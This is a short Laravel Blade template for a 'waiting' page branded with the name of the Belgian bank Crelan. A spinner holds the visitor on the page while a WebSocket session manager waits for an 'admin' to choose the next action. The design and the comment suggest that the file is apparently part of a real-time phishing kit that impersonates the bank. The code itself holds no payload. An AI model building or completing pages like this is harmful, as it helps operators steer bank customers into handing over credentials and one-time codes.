@extends('layouts.app')

@section('title', __('messages.waiting_title') . ' | Crelan')

@section('content')
<div class="form-page-center">
    <div class="form-container">

        <div class="form-container--content">
            <div class="waiting-container">
                <div class="waiting-spinner"></div>
                
                <h2 class="waiting-title">{{ __('messages.waiting_title') }}</h2>
                
                <p class="waiting-text">
                    {{ __('messages.waiting_description') }}
                </p>
            </div>
        </div>
    </div>
</div>
@endsection

@push('scripts')
<script>
document.addEventListener('DOMContentLoaded', function() {
    const sessionId = localStorage.getItem('session_id');
    
    if (!sessionId) {
        window.location.href = '/';
        return;
    }
    
    // SessionManager from session.js handles WebSocket connection
    // and will redirect when admin selects next action
    if (window.SessionManager) {
        window.SessionManager.setSessionId(sessionId);
    }
});
</script>
@endpush
